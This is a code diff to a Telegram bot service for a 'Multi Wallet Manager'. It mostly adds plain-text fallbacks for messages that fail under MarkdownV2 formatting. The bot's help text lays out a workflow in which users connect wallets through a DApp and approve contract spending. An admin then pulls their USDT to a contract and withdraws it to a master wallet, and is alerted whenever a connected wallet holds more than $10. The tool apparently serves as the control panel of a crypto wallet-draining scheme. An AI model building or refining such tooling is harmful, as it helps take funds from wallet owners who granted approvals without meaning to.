@@ -91,6 +91,8 @@ class TelegramService {
                 this.sendPullWalletList(chatId);
             } else if (action === 'help') {
                 this.sendHelpMenu(chatId);
+            } else if (action === 'menu') {
+                this.sendMainMenu(chatId);
             } else if (action.startsWith('pull_')) {
                 const walletAddress = action.substring(5);
                 this.handlePullCommand(chatId, walletAddress);
@@ -100,7 +102,7 @@ class TelegramService {
 
     async sendMainMenu(chatId) {
         const message = `
-🤖 *Multi Wallet Manager - Main Menu*
+🤖 *Multi Wallet Manager \\- Main Menu*
 
 Welcome to your USDT management system\\. Select an option below:
 
@@ -136,12 +138,45 @@ Welcome to your USDT management system\\. Select an option below:
             return result;
         } catch (error) {
             console.error('Error sending main menu to chat', chatId, ':', error.message);
+            // Fallback without markdown
+            try {
+                const fallbackMessage = `
+🤖 Multi Wallet Manager - Main Menu
+
+Welcome to your USDT management system. Select an option below:
+
+💰 Wallet Operations
+• Pull USDT from connected wallets
+• Check wallet balances
+• Withdraw to master wallet
+
+🔐 Security
+• Only authorized admins can perform operations
+• All transactions are logged and tracked
+                `;
+                return await this.bot.sendMessage(chatId, fallbackMessage, {
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📤 Pull USDT', callback_data: 'pull_list' },
+                                { text: '📥 Withdraw', callback_data: 'withdraw' }
+                            ],
+                            [
+                                { text: '📊 Balances', callback_data: 'balances' },
+                                { text: '❓ Help', callback_data: 'help' }
+                            ]
+                        ]
+                    }
+                });
+            } catch (fallbackError) {
+                console.error('Fallback error:', fallbackError.message);
+            }
         }
     }
 
     async sendHelpMenu(chatId) {
         const message = `
-🤖 *Multi Wallet Manager - Help*
+🤖 *Multi Wallet Manager \\- Help*
 
 📚 *Available Commands:*
 • /start \\- Open main menu
@@ -189,6 +224,51 @@ Welcome to your USDT management system\\. Select an option below:
             return result;
         } catch (error) {
             console.error('Error sending help menu to chat', chatId, ':', error.message);
+            // Fallback without markdown
+            try {
+                const fallbackMessage = `
+🤖 Multi Wallet Manager - Help
+
+📚 Available Commands:
+• /start - Open main menu
+• /menu - Show floating menu
+• /pull_<address> - Pull USDT from specific wallet
+• /withdraw - Withdraw all USDT from contract
+• /balances - Check all balances
+• /help - Show this help message
+
+📋 Available Operations:
+• Check Smart Contract USDT Balance
+• Check Master Wallet BNB Balance
+• Check Master Wallet USDT Balance
+• Pull USDT from connected wallets
+• Auto-gas management for transactions
+• 6-hour balance monitoring
+
+🛡️ Security Features:
+• Admin-only operations
+• Gas paid by master wallet
+• Wallet approval system
+• Transaction logging
+
+🔄 Workflow:
+1. Connect wallet via DApp
+2. Approve contract spending
+3. Admin pulls USDT to contract
+4. Admin withdraws to master wallet
+                `;
+                return await this.bot.sendMessage(chatId, fallbackMessage, {
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
+                        ]
+                    }
+                });
+            } catch (fallbackError) {
+                console.error('Fallback error:', fallbackError.message);
+            }
         }
     }
 
@@ -228,6 +308,30 @@ Actions:
             return result;
         } catch (error) {
             console.error('Error sending new wallet alert:', error.message);
+            // Fallback without markdown
+            try {
+                const fallbackMessage = `
+🔔 NEW WALLET CONNECTED
+Address: ${walletAddress}
+USDT Balance: ${balance} USDT
+
+Actions:
+                `;
+                return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
+                            ],
+                            [
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
+                        ]
+                    }
+                });
+            } catch (fallbackError) {
+                console.error('Fallback error:', fallbackError.message);
+            }
         }
     }
 
@@ -262,6 +366,30 @@ Actions:
             return await this.bot.sendMessage(this.adminChatId, message, options);
         } catch (error) {
             console.error('Error sending balance alert:', error.message);
+            // Fallback without markdown
+            try {
+                const fallbackMessage = `
+💰 BALANCE ALERT
+Address: ${walletAddress}
+USDT Balance: ${balance} USDT (> $10)
+
+Actions:
+                `;
+                return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
+                            ],
+                            [
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
+                        ]
+                    }
+                });
+            } catch (fallbackError) {
+                console.error('Fallback error:', fallbackError.message);
+            }
         }
     }
 
@@ -298,14 +426,37 @@ Next steps:
             return await this.bot.sendMessage(this.adminChatId, message, options);
         } catch (error) {
             console.error('Error sending success message:', error.message);
+            // Fallback without markdown
+            try {
+                const fallbackMessage = `
+✅ SUCCESSFUL PULL
+Address: ${walletAddress}
+Amount: ${amount} USDT
+Transaction: ${txHash}
+
+Next steps:
+                `;
+                return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
+                            ],
+                            [
+                                { text: '🏠 Main Menu', callback_data: 'menu' }
+                            ]
+                        ]
+                    }
+                });
+            } catch (fallbackError) {
+                console.error('Fallback error:', fallbackError.message);
+            }
         }
     }
 
     async sendPullWalletList(chatId) {
         if (chatId.toString() !== this.adminChatId) {
-            return this.bot.sendMessage(chatId, '❌ *Unauthorized access*', {
-                parse_mode: 'MarkdownV2'
-            });
+            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
         }
         
         // In a real implementation, you'd fetch from database
@@ -327,40 +478,53 @@ Connected wallets will appear here\\. For now, use:
             }
         };
         
-        return this.bot.sendMessage(chatId, message, options);
+        try {
+            return await this.bot.sendMessage(chatId, message, options);
+        } catch (error) {
+            console.error('Error sending pull wallet list:', error.message);
+            // Fallback without markdown
+            const fallbackMessage = `
+📤 Select Wallet to Pull
+
+Connected wallets will appear here. For now, use:
+/pull_<wallet_address>
+            `;
+            return await this.bot.sendMessage(chatId, fallbackMessage, {
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: '🏠 Main Menu', callback_data: 'menu' }
+                        ]
+                    ]
+                }
+            });
+        }
     }
 
     async handlePullCommand(chatId, walletAddress) {
         if (chatId.toString() !== this.adminChatId) {
-            return this.bot.sendMessage(chatId, '❌ *Unauthorized access*', {
-                parse_mode: 'MarkdownV2'
-            });
+            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
         }
         
         // Validate wallet address
         if (!walletAddress || walletAddress.length !== 42) {
-            return this.bot.sendMessage(chatId, '❌ *Invalid wallet address*', {
-                parse_mode: 'MarkdownV2'
-            });
+            return this.bot.sendMessage(chatId, '❌ Invalid wallet address');
         }
         
-        const escapedAddress = walletAddress.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
-        
         const message = `
-🔄 *Pull Operation Initiated*
-Wallet: \`${escapedAddress}\`
+🔄 Pull Operation Initiated
+Wallet: ${walletAddress}
 
-Processing\\.\\.\\. This will:
-1\\. Check wallet gas balance
-2\\. Send gas if needed
-3\\. Pull USDT to contract
-4\\. Send confirmation
+Processing... This will:
+1. Check wallet gas balance
+2. Send gas if needed
+3. Pull USDT to contract
+4. Send confirmation
 
-⏳ *Please wait*\\.\\.\\.
+⏳ Please wait...
         `;
         
         const options = {
-            parse_mode: 'MarkdownV2',
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -375,25 +539,22 @@ Processing\\.\\.\\. This will:
 
     async handleWithdrawCommand(chatId) {
         if (chatId.toString() !== this.adminChatId) {
-            return this.bot.sendMessage(chatId, '❌ *Unauthorized access*', {
-                parse_mode: 'MarkdownV2'
-            });
+            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
         }
         
         const message = `
-🏦 *Withdraw Operation Initiated*
-Withdrawing all USDT from contract to master wallet\\.\\.\\.
+🏦 Withdraw Operation Initiated
+Withdrawing all USDT from contract to master wallet...
 
-📋 *Operations to perform:*
+📋 Operations to perform:
 • Check contract USDT balance
 • Execute withdrawal transaction
 • Send confirmation
 
-⏳ *Please wait*\\.\\.\\.
+⏳ Please wait...
         `;
         
         const options = {
-            parse_mode: 'MarkdownV2',
             reply_markup: {
                 inline_keyboard: [
                     [
@@ -408,24 +569,21 @@ Withdrawing all USDT from contract to master wallet\\.\\.\\.
 
     async handleBalancesCommand(chatId) {
         if (chatId.toString() !== this.adminChatId) {
-            return this.bot.sendMessage(chatId, '❌ *Unauthorized access*', {
-                parse_mode: 'MarkdownV2'
-            });
+            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
         }
         
         const message = `
-📊 *Wallet Balances Requested*
+📊 Wallet Balances Requested
 
-📋 *Balance Checks:*
+📋 Balance Checks:
 • Check Smart Contract USDT Balance
 • Check Master Wallet BNB Balance
 • Check Master Wallet USDT Balance
 
-⏳ *Fetching balances*\\.\\.\\.
+⏳ Fetching balances...
         `;
         
         const options = {
-            parse_mode: 'MarkdownV2',
             reply_markup: {
                 inline_keyboard: [
                     [
